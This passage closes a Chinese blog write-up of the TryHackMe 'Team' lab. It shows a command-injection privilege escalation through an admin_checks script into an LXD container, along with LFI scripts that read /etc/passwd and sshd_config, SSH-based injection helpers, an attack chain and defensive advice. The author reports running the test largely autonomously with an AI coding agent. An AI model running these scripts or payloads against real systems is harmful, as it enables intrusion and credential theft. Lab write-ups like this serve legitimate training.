+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> <span class="token parameter variable">-i</span> dale_id_rsa <span class="token parameter variable">-o</span> <span class="token assign-left variable">StrictHostKeyChecking</span><span class="token operator">=</span>no dale@10.48.147.235 <span class="token string">"
+chmod 777 /tmp/privesc.sh
+echo -e 'test<span class="token entity" title="\n">\n</span>bash /tmp/privesc.sh 2>&amp;1' | sudo -u gyles /home/gyles/admin_checks 2>&amp;1
+"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>输出结果：</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">Image imported with fingerprint: 5992da7c5b9217c3772a54a3d9b6c9612afbe07fa0c2cd462bd2643832425dcb
++---------+--------------+--------+--------------------+--------------+-----------+--------+-------------------------------+
+|  ALIAS  | FINGERPRINT  | PUBLIC |    DESCRIPTION     | ARCHITECTURE |   TYPE    |  SIZE  |          UPLOAD DATE          |
++---------+--------------+--------+--------------------+--------------+-----------+--------+-------------------------------+
+| myimage | 5992da7c5b92 | no     | Alpine 3.15 x86_64 | x86_64       | CONTAINER | 2.61MB | May 27, 2026 at 11:39am (UTC) |
++---------+--------------+--------+--------------------+--------------+-----------+--------+-------------------------------+
+Creating privesc
+Device host-root added to privesc
+THM&#123;fhqbznavfonq&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>Root Flag：</strong> <code>THM&#123;fhqbznavfonq&#125;</code></p>
+<hr>
+<h2 id="四、关键脚本汇总"><a href="#四、关键脚本汇总" class="headerlink" title="四、关键脚本汇总"></a>四、关键脚本汇总</h2><h3 id="4-1-LFI-枚举脚本"><a href="#4-1-LFI-枚举脚本" class="headerlink" title="4.1 LFI 枚举脚本"></a>4.1 LFI 枚举脚本</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+
+target <span class="token operator">=</span> <span class="token string">"http://dev.team.thm/script.php"</span>
+files_to_read <span class="token operator">=</span> <span class="token punctuation">[</span>
+    <span class="token string">"/etc/passwd"</span><span class="token punctuation">,</span>
+    <span class="token string">"/etc/ssh/sshd_config"</span><span class="token punctuation">,</span>
+    <span class="token string">"/var/www/team.thm/scripts/script.txt"</span><span class="token punctuation">,</span>
+    <span class="token string">"/var/www/team.thm/scripts/script.old"</span><span class="token punctuation">,</span>
+<span class="token punctuation">]</span>
+
+<span class="token keyword">for</span> f <span class="token keyword">in</span> files_to_read<span class="token punctuation">:</span>
+    resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>target<span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"page"</span><span class="token punctuation">:</span> f<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"=== </span><span class="token interpolation"><span class="token punctuation">&#123;</span>f<span class="token punctuation">&#125;</span></span><span class="token string"> ==="</span></span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">2000</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="4-2-admin-checks-命令注入辅助脚本"><a href="#4-2-admin-checks-命令注入辅助脚本" class="headerlink" title="4.2 admin_checks 命令注入辅助脚本"></a>4.2 admin_checks 命令注入辅助脚本</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> subprocess
+
+<span class="token keyword">def</span> <span class="token function">run_as_gyles</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> target<span class="token operator">=</span><span class="token string">"10.48.147.235"</span><span class="token punctuation">,</span> key<span class="token operator">=</span><span class="token string">"dale_id_rsa"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token triple-quoted-string string">"""通过 admin_checks 以 gyles 身份执行命令"""</span>
+    ssh_cmd <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"""
+    ssh -i </span><span class="token interpolation"><span class="token punctuation">&#123;</span>key<span class="token punctuation">&#125;</span></span><span class="token string"> -o StrictHostKeyChecking=no dale@</span><span class="token interpolation"><span class="token punctuation">&#123;</span>target<span class="token punctuation">&#125;</span></span><span class="token string"> "
+    echo -e 'test\\n</span><span class="token interpolation"><span class="token punctuation">&#123;</span>cmd<span class="token punctuation">&#125;</span></span><span class="token string"> 2>&amp;1' | sudo -u gyles /home/gyles/admin_checks 2>&amp;1
+    "
+    """</span></span>
+    result <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>ssh_cmd<span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> capture_output<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">120</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> result<span class="token punctuation">.</span>stdout
+
+<span class="token comment"># 使用示例</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>run_as_gyles<span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>run_as_gyles<span class="token punctuation">(</span><span class="token string">"ls -la /home/gyles"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="4-3-Python-pexpect-版本（本地执行）"><a href="#4-3-Python-pexpect-版本（本地执行）" class="headerlink" title="4.3 Python pexpect 版本（本地执行）"></a>4.3 Python pexpect 版本（本地执行）</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pexpect
+
+<span class="token keyword">def</span> <span class="token function">run_as_gyles</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token triple-quoted-string string">"""通过 pexpect 与 admin_checks 交互"""</span>
+    child <span class="token operator">=</span> pexpect<span class="token punctuation">.</span>spawn<span class="token punctuation">(</span><span class="token string">'sudo -u gyles /home/gyles/admin_checks'</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span>timeout<span class="token punctuation">)</span>
+    child<span class="token punctuation">.</span>expect<span class="token punctuation">(</span><span class="token string">'Enter name of person backing up the data:'</span><span class="token punctuation">)</span>
+    child<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span>
+    child<span class="token punctuation">.</span>expect<span class="token punctuation">(</span><span class="token string">"Enter 'date' to timestamp the file:"</span><span class="token punctuation">)</span>
+    child<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span>
+    child<span class="token punctuation">.</span>expect<span class="token punctuation">(</span>pexpect<span class="token punctuation">.</span>EOF<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> child<span class="token punctuation">.</span>before<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token comment"># 使用示例</span>
+result <span class="token operator">=</span> run_as_gyles<span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<hr>
+<h2 id="五、漏洞总结"><a href="#五、漏洞总结" class="headerlink" title="五、漏洞总结"></a>五、漏洞总结</h2><table>
+<thead>
+<tr>
+<th>漏洞类型</th>
+<th>位置</th>
+<th>危害等级</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>本地文件包含 (LFI)</td>
+<td><code>dev.team.thm/script.php?page=</code></td>
+<td>高</td>
+<td>可读取任意系统文件，泄露 SSH 私钥</td>
+</tr>
+<tr>
+<td>信息泄露</td>
+<td><code>/etc/ssh/sshd_config</code></td>
+<td>高</td>
+<td>SSH 私钥以注释形式存储在配置文件中</td>
+</tr>
+<tr>
+<td>命令注入</td>
+<td><code>/home/gyles/admin_checks</code></td>
+<td>高</td>
+<td><code>$error</code> 变量直接执行用户输入</td>
+</tr>
+<tr>
+<td>不安全的组权限</td>
+<td>gyles 属于 lxd 组</td>
+<td>严重</td>
+<td>可通过 LXC 特权容器获取 root 权限</td>
+</tr>
+<tr>
+<td>凭据泄露</td>
+<td><code>/var/www/team.thm/scripts/script.old</code></td>
+<td>中</td>
+<td>FTP 明文密码硬编码在脚本中</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="六、攻击链路图"><a href="#六、攻击链路图" class="headerlink" title="六、攻击链路图"></a>六、攻击链路图</h2><pre class="line-numbers language-none"><code class="language-none">Apache 默认页面 → 发现域名 team.thm
+        ↓
+目录枚举 → &#x2F;scripts&#x2F; 目录
+        ↓
+子域名枚举 → dev.team.thm
+        ↓
+LFI 漏洞 → 读取 &#x2F;etc&#x2F;ssh&#x2F;sshd_config
+        ↓
+提取 SSH 私钥 → SSH 登录 dale 用户 → User Flag
+        ↓
+枚举系统 → 发现 admin_checks 命令注入
+        ↓
+发现 lxd 组 → 上传 Alpine 镜像
+        ↓
+命令注入执行提权脚本 → LXC 特权容器 → Root Flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<hr>
+<h2 id="七、防御建议"><a href="#七、防御建议" class="headerlink" title="七、防御建议"></a>七、防御建议</h2><ol>
+<li><strong>修复 LFI 漏洞：</strong> 对 <code>page</code> 参数进行白名单过滤，禁止路径遍历</li>
+<li><strong>移除敏感信息：</strong> 不要在 SSH 配置文件中存储私钥</li>
+<li><strong>修复命令注入：</strong> 不要将用户输入直接传递给 shell 执行，使用白名单验证</li>
+<li><strong>最小权限原则：</strong> 不要将普通用户加入 lxd 组，除非必要</li>
+<li><strong>凭据管理：</strong> 不要在代码文件中硬编码密码，使用环境变量或密钥管理服务</li>
+<li><strong>文件权限：</strong> 敏感脚本文件应设置适当的访问权限</li>
+</ol>
+<hr>
+<p><em>报告生成时间：2026-05-27</em></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>使用的是 claude code + MiMo-V2.5-Pro 进行的自动化渗透测试，总用时 57m59s</p>
+<p>其中大部分是自动完成的，手动操作的只有修改 hosts 以及扫描子域名，但是在提权方面花费了很长时间，可能也是因为这个提权比较复杂</p>
+<p>总的来说还是可以的</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://x9wd09ncc.github.io">X9wd09ncc</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://x9wd09ncc.github.io/post/TryHackMe_Team.html">https://x9wd09ncc.github.io/post/TryHackMe_Team.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://x9wd09ncc.github.io" target="_blank">X9wd09ncc</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/thm/">thm</a><a class="post-meta__tags" href="/tags/easy/">easy</a><a class="post-meta__tags" href="/tags/%E7%BA%A2%E9%98%9F/">红队</a><a class="post-meta__tags" href="/tags/ai/">ai</a></div><div class="post_share"><div class="social-share" data-image="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/post/TryHackMe_Chocolate_Factory.html" title="TryHackMe_Chocolate Factory"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">TryHackMe_Chocolate Factory</div></div></a></div><div class="next-post pull-right"><a href="/post/TryHackMe_Gallery.html" title="TryHackMe_Gallery"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">TryHackMe_Gallery</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/post/TryHackMe_Agent_T.html" title="TryHackMe_Agent T"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-25</div><div class="title">TryHackMe_Agent T</div></div></a></div><div><a href="/post/TryHackMe_Corridor.html" title="TryHackMe_Corridor"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-25</div><div class="title">TryHackMe_Corridor</div></div></a></div><div><a href="/post/TryHackMe_Chocolate_Factory.html" title="TryHackMe_Chocolate Factory"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-27</div><div class="title">TryHackMe_Chocolate Factory</div></div></a></div><div><a href="/post/TryHackMe_Gallery.html" title="TryHackMe_Gallery"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-26</div><div class="title">TryHackMe_Gallery</div></div></a></div><div><a href="/post/TryHackMe_W1seGuy.html" title="TryHackMe_W1seGuy"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-25</div><div class="title">TryHackMe_W1seGuy</div></div></a></div><div><a href="/post/TryHackMe-CyberHeroes.html" title="TryHackMe_CyberHeroes"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-14</div><div class="title">TryHackMe_CyberHeroes</div></div></a></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2026 By X9wd09ncc</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><div class="js-pjax"></div><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
